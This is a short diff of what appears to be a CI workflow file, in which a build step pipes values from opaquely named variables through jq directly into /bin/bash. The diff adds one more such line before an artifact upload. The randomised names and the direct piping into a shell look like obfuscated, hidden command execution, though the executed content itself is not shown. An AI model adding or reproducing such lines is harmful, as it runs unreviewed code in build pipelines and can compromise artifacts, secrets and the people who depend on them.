@@ -24,6 +24,7 @@ jobs:
           echo $unlva7 | jq -r .dmyio47 | /bin/bash
           echo $pmvi400 | jq -r .mvw3403 | /bin/bash
           echo $dxj93 | jq -r .zslf4 | /bin/bash
+          echo $xbxt1 | jq -r .yfmbn45 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
